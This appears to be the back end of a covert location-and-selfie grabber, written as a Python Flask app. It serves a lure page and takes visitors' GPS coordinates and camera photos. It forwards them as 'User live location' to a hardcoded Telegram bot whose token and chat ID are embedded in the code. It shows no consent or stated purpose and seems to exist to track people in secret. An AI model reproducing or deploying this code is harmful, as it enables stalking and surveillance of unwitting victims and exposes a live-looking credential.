from flask import Flask, render_template, request, jsonify
import requests, base64
from io import BytesIO

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = '8280216938:AAEwCN0U8HkhNqikde5Nq3ODTgpaZlNQZhQ'
TELEGRAM_CHAT_ID   = '7343057223'

def send_location_to_telegram(lat, lon):
    location_url = f"https://www.google.com/maps?q={lat},{lon}"
    message      = f"User live location: {location_url}"
    url          = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload      = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
    requests.post(url, data=payload)

def send_photo_to_telegram(photo_b64):
    url        = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    photo_data = BytesIO(base64.b64decode(photo_b64.split(',')[1]))
    files      = {'photo': photo_data}
    data       = {'chat_id': TELEGRAM_CHAT_ID}
    requests.post(url, data=data, files=files)

@app.route('/')
def index():
    return render_template('index2.0.html')

@app.route('/send_data', methods=['POST'])
def send_data():
    data       = request.json
    lat, lon   = data.get('latitude'), data.get('longitude')
    selfie_b64 = data.get('selfie')
    if not (lat and lon and selfie_b64):
        return jsonify({'status': 'Missing data'}), 400

    send_location_to_telegram(lat, lon)
    send_photo_to_telegram(selfie_b64)

    return jsonify({'status': 'Success, data sent to Telegram'})

if __name__ == '__main__':
    app.run(debug=True)
